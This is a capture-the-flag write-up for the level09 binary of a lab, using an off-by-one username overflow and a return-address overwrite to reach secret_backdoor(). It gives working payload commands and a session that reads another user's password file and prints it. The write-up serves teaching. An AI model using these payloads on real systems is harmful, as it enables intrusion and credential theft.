Level09
-------

1) 
Running this binary prompts for a username and a message, both read using fgets(). 
After disassembling, we notice a function called secret_backdoor() which executes system() on user input, but it is never called during normal execution. 
This suggests we need to overwrite the saved return address (RIP) to redirect execution to it.

2) We can see in the assembly file all the functions

Both functions use local buffers and then copy data into this structure:

-set_msg() uses:
strncpy(buffer, input, len);
-set_username() copies byte-by-byte in a loop

The vulnerability comes from set_username():

for (i = 0; i <= 40; i++)
    buf[0x8c + i] = input[i];

The loop runs 41 times, allowing a 1-byte overflow

--Key observation--
0xb4 (len) - 0x8c (username) = 40
The 41st byte overwrites len

This allows us to control the size used in strncpy():

original len = 140 (0x8c)
new len = 208 (0xD0)

3) --Offset to RIP


buffer starts at rbp - 0xc0 (192 bytes)
saved RBP = 8 bytes
→ RIP = 192 + 8 = 200 bytes

To overwrite RIP (8 bytes on 64-bit):

200 + 8 = 208 bytes


STEP 1:
------

Overwrite len via username
"A"*40 + "\xD0"

STEP 2:
-------

Overflow buffer via message
"B"*200 + address

STEP 3:
-------

Target:
secret_backdoor: 0x55555555488c

Little endian:
\x8c\x48\x55\x55\x55\x55\x00\x00

And for the final step(final payload):

python -c 'print("A"*40 + "\xD0")' > tmp
python -c 'print("B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00")' >> tmp
(cat tmp; cat) | ./level09


And the result:




level09@OverRide:~$ python -c 'print("A"*40 + "\xD0")' > /tmp/pass
level09@OverRide:~$ python -c 'print("B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00")' >> /tmp/pass
level09@OverRide:~$ (cat /tmp/pass; cat) | ./level09





--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!



cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE


level09@OverRide:~$ su end
Password: 
end@OverRide:~$ 